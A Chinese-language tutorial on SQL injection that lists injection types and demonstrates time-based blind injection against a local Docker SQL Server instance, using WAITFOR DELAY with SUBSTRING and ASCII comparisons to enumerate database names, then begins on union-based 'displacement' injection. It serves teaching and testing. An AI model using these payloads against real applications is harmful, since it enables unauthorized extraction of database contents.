# SQL注入简介

**SQL注入**（英语：SQL injection），也称**SQL注入**或**SQL注码**，是发生于应用程序与数据库层的[安全漏洞](https://zh.wikipedia.org/wiki/安全漏洞)。简而言之，是在输入的字符串之中注入[SQL](https://zh.wikipedia.org/wiki/SQL)指令，在设计不良的[程序](https://zh.wikipedia.org/wiki/计算机程序)当中忽略了字符检查，那么这些注入进去的恶意指令就会被[数据库](https://zh.wikipedia.org/wiki/資料庫)[服务器](https://zh.wikipedia.org/wiki/伺服器)误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。

白话来说就是：未对用户输入数据做过滤，将用户输入数据当作代码来执行。



## 注入类型

根据使用的技巧，SQL注入类型可分为：

- 盲注
  * 布尔盲注：只能从应用返回中推断语句执行后的布尔值
  * 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
- 报错注入：应用会显示全部或者部分的报错信息
- 堆叠注入：有的应用可以加入`;`后一次执行多条语句

根据不同数据库服务器，注入语句也有所不同。



# SQL Server

## 简介

WAITFOR是SQL Server中Transact-SQL提供的一个流程控制语句。它的作用就是等待特定时间后，继续执行后续语句。它包含一个参数DELAY，用来指定等待的时间。

```sql
# 用法：上述语句表示等待5秒再执行操作。
WAITFOR DELAY '0:0:5'

# 示例：
select 1 WAITFOR DELAY '0:0:5'
```

这里是在centos7上通过docker部署的SQL Server

```
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=Qwer1234" -p 1433:1433 --name ssql  -d mcr.microsoft.com/mssql/server:2017-latest
```

通过工具或配置代码，即可连接。

使用命令查看SQL Server版本

```sql
select @@version

Microsoft SQL Server 2017 (RTM-CU25) (KB5003830) - 14.0.3401.7 (X64) 
	Jun 25 2021 14:02:48 
	Copyright (C) 2017 Microsoft Corporation
	Developer Edition (64-bit) on Linux (Ubuntu 16.04.7 LTS)
```



## SQL注入常用函数

### SUBSTRING

字符截断函数：SUBSTRING(expression, start, length)  

其中：

* expression：需要被截断的字符，可以是字符，二进制，文本，`ntext`或图像表达式。
* start：从第几位开始截断
* length：需要是一个正整数，否则会报错，用来指定总共需要截断的字符长度

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817211405.png)

构造注入语句，判断是否存在注入点

```
SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING(DB_NAME(), 1, 1) = 'm') WAITFOR delay '0:0:3';


SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING(DB_NAME(), 1, 1) = CHAR(109)) WAITFOR delay '0:0:3';
```

#### ASCII码半截法

```
SELECT name
FROM sys.databases
where database_id = 1
IF ASCII(SUBSTRING(DB_NAME(), 1, 1)) > 30
WAITFOR DELAY '0:0:3';
```

通过判断字符的ASCII可以枚举该字段的所有值。

也可以构造子查询语句来实现SQL注入。

```
SELECT name
FROM sys.databases
where database_id = 1
IF (SUBSTRING((SELECT name
FROM sys.databases
where database_id = 2), 3, 1)) = 'm'
WAITFOR DELAY '0:0:3';
```

id为2的值参考上图中的结果。



## 高级注入技巧——位移注入



这种注入方式适合在找到表但是找不到字段的情况下使用。

这种注入方式需要联合两张表，所以该注入方式也是联合查询的一种。

### 原理

在SQL注入中，甚至在Linux系统中，`*`表示所有。比如：

```
SELECT * FROM sys.databases;
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817220310.png)

`*`在这里表示返回所有字段的所有值。

